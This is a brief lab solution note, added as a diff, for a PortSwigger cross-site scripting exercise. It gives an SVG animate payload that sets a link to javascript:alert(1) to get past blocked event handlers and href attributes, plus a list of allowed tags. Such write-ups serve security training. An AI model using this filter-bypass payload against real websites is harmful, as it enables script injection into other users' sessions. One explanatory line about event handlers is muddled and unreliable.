@@ -1,0 +1,13 @@
+Exercise: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
+Payload:
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink><text x="30" y="20" fill="black">Click</text><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+Reasons:
++) Allowed tags:
+    <a>
+    <animate>
+    <discard>
+    <image>
+    <svg>
+    <title>
++) <text> is a sub-tag of svg-a for creating a tag that can be clicked to alert()
++) <animate> tag is for alerting with using event handlers
